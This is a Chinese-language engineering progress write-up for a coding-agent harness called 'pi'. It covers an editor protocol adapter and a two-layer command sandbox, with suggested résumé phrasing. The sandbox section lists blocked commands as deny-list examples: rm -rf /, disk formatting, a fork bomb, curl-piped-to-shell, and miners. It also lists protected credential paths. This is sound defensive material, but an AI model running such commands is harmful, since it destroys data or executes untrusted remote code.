# Phase 2：ACP 适配层 + Sandbox 执行

> 完成日期：2026-08-07
> 代码位置：
> - ACP 适配层：[packages/coding-agent/examples/extensions/acp/](../../packages/coding-agent/examples/extensions/acp/)
> - Sandbox：[packages/coding-agent/examples/extensions/sandbox/](../../packages/coding-agent/examples/extensions/sandbox/)

---

## 模块 3：ACP 适配层

**目标**：把 pi 包装成 [Agent Client Protocol](https://github.com/zed-industries/agent-client-protocol) Agent，使 Zed / JetBrains AI Assistant 等任何实现 ACP 的编辑器能直接调用 pi 作为 coding agent。

**完成状态**：✅ 已完成 v0.1，约 350 行 glue code。

### 参考实现（实际使用的）

| 用途 | 选型 | 说明 |
|---|---|---|
| 协议规范 + TS SDK（实际使用 `@agentclientprotocol/sdk@^1.3.0`） | [`zed-industries/agent-client-protocol`](https://github.com/zed-industries/agent-client-protocol) | 官方 TypeScript SDK，提供 Agent/Client 两端的类型、ndjson 流、ActiveSession 助手；不需要自己写 JSON-RPC 解析 |
| 适配器架构参考 | [`zed-industries/claude-code-acp`](https://github.com/zed-industries/claude-code-acp) | Claude Code 官方接入 ACP 的参考实现，展示了如何把 agent SDK 事件映射为 ACP session/update 通知 |
| pi 进程内 SDK | pi 自带 [examples/sdk/](../../packages/coding-agent/examples/sdk/) 的 `createAgentSession` | **同进程集成**而非走 `packages/client` RPC 子进程，更轻量，避免双进程序列化开销 |

### 架构设计关键决策

**同进程 vs 子进程**：一开始规划是独立 `packages/acp-server` 通过 `pi-client` 走 RPC 子进程（路线图原始方案），实现时发现 pi 的 `createAgentSession` SDK 可以直接在当前 Node 进程内创建 AgentSession，**不需要起子进程**——这样简化了部署（单个二进制/脚本即可）、减少了序列化开销，且能直接订阅 pi 的 TypeScript 事件对象，事件桥接更直接。

文件拆分：
- `lib.ts` — 纯逻辑 `PiAcpAgent` 类 + `buildAgentApp()` 工厂，无副作用，可被测试直接 import
- `index.ts` — stdio 入口，把 lib 输出接到 stdin/stdout 的 ndjson 流，这是编辑器 spawn 的二进制

### 实际实现的能力清单

| 能力 | 实现状态 |
|---|---|
| **Transport** | ✅ stdio ndjson（编辑器标准方式），通过 `acp.ndJsonStream(stdoutWeb, stdinWeb)` 连接 |
| **Protocol Handshake** | ✅ `initialize` → 协商协议版本、返回 `serverInfo: { name: "pi-coding-agent", version: "0.1.0" }` 和 agentCapabilities |
| **Session Lifecycle** | ✅ `session/new` 为每个 ACP 会话创建隔离的 pi AgentSession（独立 `agentDir` 在 tmp 下、独立 cwd、独立 SettingsManager/SessionManager/ResourceLoader）；`session/close` 清理 unsubscribe + dispose |
| **Extensions 自动加载** | ✅ `session.bindExtensions({ mode: "rpc" })` — ACP 会话自动加载所有已安装 pi 扩展（包括 MCP、Memory），编辑器通过 ACP 即可使用全部 pi 能力 |
| **Prompt 转发** | ✅ `session/prompt` 把 ACP content blocks（text/...）拼接后转发给 `piSession.prompt(message, { source: "acp" })` |
| **Cancel 支持** | ✅ `session/cancel` 通过 AbortController + `session.abort()` 中止当前 turn |
| **事件 → ACP session/update 桥接** | ✅ |
| ↳ 文本流（`message_update`） | ✅ 50ms 缓冲后发送 `agent_message_chunk`，避免每个 token 一个 RPC |
| ↳ 工具调用开始（`tool_execution_start`） | ✅ 发送 `tool_call` 通知，带 `toolCallId`、`title`、推断的 `kind`（terminal/read/edit/delete/tool） |
| ↳ 工具调用输出（`tool_execution_update`） | ✅ 发送 `tool_call_update` 带运行中状态 + 截断输出 |
| ↳ 工具调用结束（`tool_execution_end`） | ✅ 发送 `tool_call_update` 带 completed/error 状态 + 结果 |
| **Client 请求处理** | ✅ 注册 `requestPermission` / `fs.readTextFile` / `fs.writeTextFile` 处理器（测试默认 allow_once） |
| **模式切换** | ✅ `session/set_mode` 占位返回空（v0.1 暂未实现 plan/act 模式切换） |
| **E2E 测试** | ✅ 使用官方 SDK 的 in-process `App.connectWith(App)` 模式（不 spawn 子进程），验证 initialize 握手 → session/new → prompt → 流式通知 → stopReason → close 完整生命周期 |

### 事件桥接映射表

| pi 事件 | ACP session/update |
|---|---|
| `message_update` (delta 文本) | `agent_message_chunk` |
| `tool_execution_start` | `tool_call` (status=pending) |
| `tool_execution_update` (delta 输出) | `tool_call_update` (status=running) |
| `tool_execution_end` | `tool_call_update` (status=completed/error) |
| (turn 结束，由 prompt() Promise resolve) | `session/prompt` response with `stopReason` |

### 使用方式

```bash
# 方式一：直接作为 stdio server 运行（编辑器会自动 spawn）
npx tsx packages/coding-agent/examples/extensions/acp/index.ts

# 方式二：Zed 配置（~/.config/zed/settings.json）
{
  "agent_servers": {
    "pi-coding-agent": {
      "command": "npx",
      "args": ["tsx", "/path/to/pi-main/packages/coding-agent/examples/extensions/acp/index.ts"],
      "cwd": "/path/to/your/project"
    }
  }
}

# 方式三：跑 e2e 测试
npx tsx packages/coding-agent/examples/extensions/acp/scripts/e2e-test.ts
```

### 简历话术

**"为自研极简 coding agent harness (pi) 实现 ACP (Agent Client Protocol) 协议适配层，基于官方 `@agentclientprotocol/sdk@^1.3.0` 同进程嵌入 AgentSession 而非子进程 RPC，把 agent 内部事件流（partial message delta/tool start/output/end）翻译为 ACP `session/update` 流式通知，支持 session 隔离、取消、权限回调、文件系统客户端请求，使 pi 可作为 drop-in coding agent 接入 Zed/JetBrains 等任何遵循 ACP 标准的编辑器，完整协议生命周期通过 in-process e2e 测试验证。"**

> **注**：ACP（Agent Client Protocol）由 Zed 编辑器团队于 2026 年初推出，定位是"AI 编码助手的 LSP"，目前生态尚在早期（Claude Code、Codex CLI 均已推出官方适配器），简历上这是明确的先发信号。

---

## 模块 4：Sandbox 执行层

**目标**：防止 agent 意外执行破坏性命令（`rm -rf /`、fork bomb、mkfs 等），并对所有 bash 命令施加 OS 级文件系统 + 网络隔离。

**完成状态**：✅ 已完成 v0.1，约 470 行。

### 选型决策

路线图最初推荐 microsandbox（microVM 自托管），实际实现时改用 **`@anthropic-ai/sandbox-runtime`（ASRT，Claude Code 官方沙箱运行时）**，原因：
1. **macOS 原生支持**——microsandbox 依赖 Linux KVM/firecracker，开发机（macOS）无法验证；ASRT 使用 macOS 内置 `sandbox-exec`（Seatbelt）、Linux 使用 `bubblewrap`，双平台开箱即用
2. **生产级验证**——ASRT 是 Claude Code 数百万用户在用的沙箱，成熟度高
3. **零 VM 开销**——OS 系统调用级沙箱，不需要启动虚拟机，毫秒级生效
4. **pi 官方已提供基础示例**——在其基础上做增强而非从零写

> 未来若需要强隔离（不可信代码执行、多租户），可以在当前架构上扩展一层 E2B/microsandbox 作为"二级硬沙箱"，通过新增 `BashOperations` 实现切换即可，接口已抽象。

### 双层防御架构

| 层级 | 机制 | 作用 |
|---|---|---|
| **L1 致命命令静态分析** | 正则模式匹配（11 类致命模式） | 在命令进入沙箱**之前**就阻断明显破坏性操作，给出清晰错误消息 |
| **L2 OS 级沙箱** | `@anthropic-ai/sandbox-runtime` 生成 sandbox-exec/bwrap profile，包装命令执行 | 文件系统读写限制、网络出口白名单、进程隔离 |
| **L3 审计日志** | `<agentDir>/sandbox-audit.jsonl` 逐条记录 | 所有命令（含被阻断的）记录时间、cwd、模式、退出码、耗时 |

### 实际实现的能力清单

| 能力 | 实现状态 |
|---|---|
| **Tool Override 方式** | ✅ 注册同名 `bash` 工具覆盖内置，通过 `createBashTool(ctx.cwd, { operations })` 切换后端 |
| **user_bash 拦截** | ✅ 通过 `pi.on("user_bash")` 同时拦截 CLI 交互模式的 bash 执行 |
| **L1 致命命令拦截** | ✅ 11 类模式：rm -rf/、rm -rf ~、mkfs/fdisk/parted、dd 到块设备、fork bomb、shutdown/reboot/halt、chmod 777 系统目录、重定向到块设备、curl/wget \| sh、xmrig/minerd 等挖矿程序 |
| **智能分段检测** | ✅ 按 `; && \|\|` 分段检测，避免 `grep 'shutdown'` 误报；fork bomb 等含分号的模式单独全命令匹配 |
| **sudo 前缀支持** | ✅ 所有致命命令模式支持可选 `sudo ` 前缀 |
| **L2 OS 沙箱 - 文件系统** | ✅ denyRead：`~/.ssh ~/.aws ~/.gnupg ~/.kube ~/.azure ~/.config/gcloud`；denyWrite：`.env .env.* *.pem *.key id_rsa*`；allowWrite：cwd、/tmp |
| **L2 OS 沙箱 - 网络** | ✅ allowedDomains 白名单（npm/pypi/github/googleapis/docker/microsoft 共 16 个域名）；deniedDomains 默认阻断云元数据 `169.254.169.254`（防止 SSRF 偷凭证） |
| **三模式切换** | ✅ `on`（OS 沙箱启用）/ `audit-only`（初始化失败/非 darwin/linux 时降级，只记录不隔离）/ `off`（`--no-sandbox` 标志，仍然保留 L1 致命拦截+审计） |
| **会话生命周期** | ✅ `session_start` 时 `SandboxManager.initialize(config)`；`session_shutdown` 时 `SandboxManager.reset()`；状态栏显示 `🔒 Sandbox: N domains, M write paths` |
| **JSONL 审计日志** | ✅ 每条记录 ts/command/cwd/mode( blocked-lethal/sandboxed/audit-only/local/error )/exitCode/durationMs/reason；写入 `<agentDir>/sandbox-audit.jsonl` |
| **/sandbox 命令** | ✅ 三个子命令：`/sandbox`（status，显示模式/配置统计/最近 3 条）；`/sandbox log [N]`（查看最近 N 条审计，默认 10）；`/sandbox test`（自检：测试致命过滤器+沙箱状态+审计文件） |
| **--no-sandbox CLI flag** | ✅ `pi -e ./sandbox --no-sandbox` 关闭 OS 沙箱但保留致命拦截+审计 |
| **配置文件** | ✅ 全局 `~/.pi/agent/extensions/sandbox.json` + 项目级 `<cwd>/.pi/sandbox.json` 合并（项目覆盖全局），支持 enabled/blockLethal/network/filesystem 全量配置 |
| **失败降级** | ✅ OS 沙箱初始化失败时自动降级到 audit-only 模式，不中断会话 |
| **E2E 测试** | ✅ 35 个断言——14 项致命命令阻断、13 项安全命令放行（无误报）、4 项复合命令场景、macOS 上 SandboxManager.initialize/wrapWithSandbox/reset 全流程验证 |

### L1 致命命令拦截覆盖清单

| 命令类型 | 示例 |
|---|---|
| 删除根目录/家目录 | `rm -rf /`、`rm -r -f /`、`sudo rm -rf ~`、`rm -Rf --no-preserve-root /` |
| 磁盘格式化 | `mkfs.ext4 /dev/sda1`、`sudo fdisk /dev/sda`、`parted /dev/sda` |
| 写入块设备 | `dd if=iso of=/dev/sdb bs=4M`、`echo x > /dev/sda` |
| Fork bomb | `:(){ :\|:& };:`、文字提及 "fork bomb" |
| 关机/重启 | `shutdown -h now`、`sudo reboot`、`halt`、`init 0`、`telinit 6` |
| chmod 777 系统目录 | `chmod -R 777 /etc`、`sudo chmod 777 ~` |
| curl\|sh 远程代码执行 | `curl https://x.com/i.sh \| bash`、`wget -O- http://x \| sudo sh` |
| 挖矿程序 | `xmrig --pool=x`、`minerd`、`cpuminer`、`ccminer`、`ethminer` |

### 简历话术

**"为自研 coding agent harness (pi) 设计实现双层命令沙箱：L1 致命命令静态分析（11 类破坏性模式智能分段检测，避免 grep/echo 误报）+ L2 基于 Anthropic `@anthropic-ai/sandbox-runtime`（Claude Code 同款）的 OS 级 Seatbelt/bubblewrap 沙箱，施加文件系统读写限制、网络出口白名单（含云元数据 SSRF 防护），完整 JSONL 审计日志支持事后溯源，三模式运行（on/audit-only/off）+ 失败自动降级，通过 35 项 e2e 测试覆盖阻断/放行/复合命令场景。"**
